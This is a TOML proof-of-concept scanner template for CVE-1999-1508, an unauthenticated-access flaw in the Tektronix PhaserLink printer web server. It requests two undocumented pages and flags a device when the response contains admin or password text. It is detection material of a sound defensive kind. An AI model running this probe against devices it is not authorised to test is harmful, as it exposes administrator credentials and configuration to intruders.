[info]
author = "ave"
description = "检测 Tektronix PhaserLink Printer 是否存在未授权访问漏洞。通过直接请求 ncl_items.html 或 ncl_subjects.html 等未公开 URL，若返回包含管理员密码或配置信息，则确认存在漏洞。"
id = "POC-AVE-1999-1980"
name = "Tektronix PhaserLink Printer WebServer 未授权访问 PoC"
severity = "critical"
tags = ["ave-1999-1980"]
vuln_id = [
    "CVE-1999-1508",
    "AVE-1999-1980",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/ncl_items.html"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Admin",
    "Password",
    "admin",
    "password",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/ncl_subjects.html"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Admin",
    "Password",
    "admin",
    "password",
]
